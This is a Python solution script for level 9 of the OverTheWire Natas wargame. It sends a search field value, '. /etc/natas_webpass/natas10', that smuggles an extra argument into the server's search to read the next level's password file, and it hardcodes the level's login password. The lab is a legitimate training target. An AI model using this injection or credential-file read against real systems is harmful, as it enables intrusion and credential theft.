import requests
import re

username = 'natas9'
password = 'W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl'
url = 'http://%s.natas.labs.overthewire.org' % username

payload = {'needle': '. /etc/natas_webpass/natas10', 'submit': 'Search'}

session = requests.Session()

response = session.post(url, data=payload, auth=(username, password))

content = response.text

flag = re.findall('<pre>/etc/natas_webpass/natas10</pre>', content)

print(content)